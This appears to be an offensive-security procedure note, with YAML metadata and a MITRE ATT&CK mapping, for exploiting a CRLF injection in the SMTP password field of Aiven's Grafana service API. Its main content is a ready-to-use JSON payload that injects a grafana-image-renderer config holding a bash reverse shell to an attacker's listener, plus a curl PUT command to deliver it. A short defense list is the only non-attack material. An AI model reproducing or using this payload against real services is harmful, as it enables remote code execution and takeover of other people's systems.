---
id: proc-uuid-003
tags:
  - crlf-injection
  - api
  - smtp
  - payload-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:54.871Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-CRLF-Payload-into-SMTP-Password-via-Aiven-API

## Summary

This procedure exploits the CRLF injection vulnerability in the Aiven Grafana SMTP password field by sending a crafted PUT request to the API, injecting a configuration snippet for the grafana-image-renderer plugin to enable command execution.

## Description

The Aiven API endpoint for service configuration allows newlines in the password field without sanitization, permitting attackers to append arbitrary INI-style configuration sections. The payload injects [plugin.grafana-image-renderer] with rendering_args set to a bash reverse shell command, targeting the attacker's listener.

## Requirements

1. Valid Aiven API v1 token (extracted from browser)
2. Known PROJECT_NAME and GRAFANA_INSTANCE_NAME from provisioning
3. Attacker's SERVER_IP for reverse shell callback
4. Tool like curl for sending the HTTP request

## Defense

Defensive measures and detection strategies:

- Sanitize input fields to reject control characters like \r\n
- Validate configuration payloads against allowlists
- Log and alert on configuration changes with unusual content

## Objectives

1. Inject malicious configuration via CRLF
2. Override grafana-image-renderer settings
3. Set up for RCE without direct authentication bypass

## Instructions

### Step 1: Prepare Payload

**Context**: Construct the JSON payload with CRLF injection in the password.

The payload should be:

```json
{
  "user_config": {
    "smtp_server": {
      "host": "example.org",
      "port": 1,
      "from_address": "x@example.org",
      "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c 'bash -i >& /dev/tcp/SERVER_IP/4444 0>&1 2>&1'"
    }
  }
}
```
Replace SERVER_IP with your IP.

**Expected Output**: Valid JSON string ready for HTTP body.

### Step 2: Send PUT Request

**Context**: Update the service configuration via API.

Use curl to send the request:

```bash
curl -X PUT -H "Authorization: aivenv1 YOUR_TOKEN" -H "Content-Type: application/json" -d 'PAYLOAD_JSON' https://api.aiven.io/v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME
```

> Replace YOUR_TOKEN, PROJECT_NAME, GRAFANA_INSTANCE_NAME, and PAYLOAD_JSON. The injection uses \r\n to break out and add the plugin section.

**Expected Output**: HTTP 200 OK with updated config confirmation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- crlf-injection
- api
- smtp
- payload-injection
